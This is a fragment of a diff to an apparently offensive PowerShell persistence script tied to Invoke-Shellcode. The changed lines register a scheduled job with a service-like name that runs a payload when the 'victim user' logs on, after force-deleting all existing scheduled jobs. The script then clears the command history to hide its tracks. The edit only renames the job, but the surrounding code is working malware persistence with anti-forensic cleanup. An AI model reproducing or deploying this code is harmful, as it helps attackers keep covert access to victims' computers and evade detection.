@@ -103,7 +103,7 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
        $scriptblock = [scriptblock]::Create($script)
        $deleteschedule = {Get-ScheduledJob | Unregister-ScheduledJob -Force}
        Invoke-Command -ScriptBlock $deleteschedule
-       Register-ScheduledJob -Name BootService -ScriptBlock $scriptblock -Trigger $Trig -ScheduledJobOption $Option
+       Register-ScheduledJob -Name BootServicer -ScriptBlock $scriptblock -Trigger $Trig -ScheduledJobOption $Option
        "Process Complete. Persistent schtask is created and will be triggered once the victim user logs on the computer."
        Clear-History
     }
